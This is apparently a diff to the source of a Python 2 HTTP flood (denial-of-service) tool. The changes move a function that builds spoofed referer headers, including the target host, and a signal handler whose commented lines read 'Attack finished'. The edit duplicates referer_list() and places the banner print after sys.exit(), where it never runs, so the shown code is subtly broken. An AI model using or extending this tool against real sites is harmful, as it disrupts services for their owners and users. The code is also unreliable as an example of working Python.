@@ -3466,7 +3466,22 @@ def referer_list():
 	headers_referers.append('http://search.iminent.com/es-ES/search/#q=')
 	return(headers_referers)
 
-print \
+# generates a referer array
+def referer_list():
+	global headers_referers
+	headers_referers = []
+	headers_referers.append('http://www.usatoday.com/search/results?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('http://' + host + '/')
+	return(headers_referers)
+
+def handler(signum,_):
+	# if signum == signal.SIGALRM:
+		# print 'Time is up'
+		# print 'Attack finished '
+	sys.exit()
+	
+	print \
 """
                   /\    
                  / |\   
@@ -3517,21 +3532,6 @@ print \
                `.____.'
                  V   V 
 """""""""
-
-# generates a referer array
-def referer_list():
-	global headers_referers
-	headers_referers = []
-	headers_referers.append('http://www.usatoday.com/search/results?q=')
-	headers_referers.append('http://engadget.search.aol.com/search?q=')
-	headers_referers.append('http://' + host + '/')
-	return(headers_referers)
-
-def handler(signum,_):
-	# if signum == signal.SIGALRM:
-		# print 'Time is up'
-		# print 'Attack finished '
-	sys.exit()
 
 #builds random ascii string
 def buildblock(size):
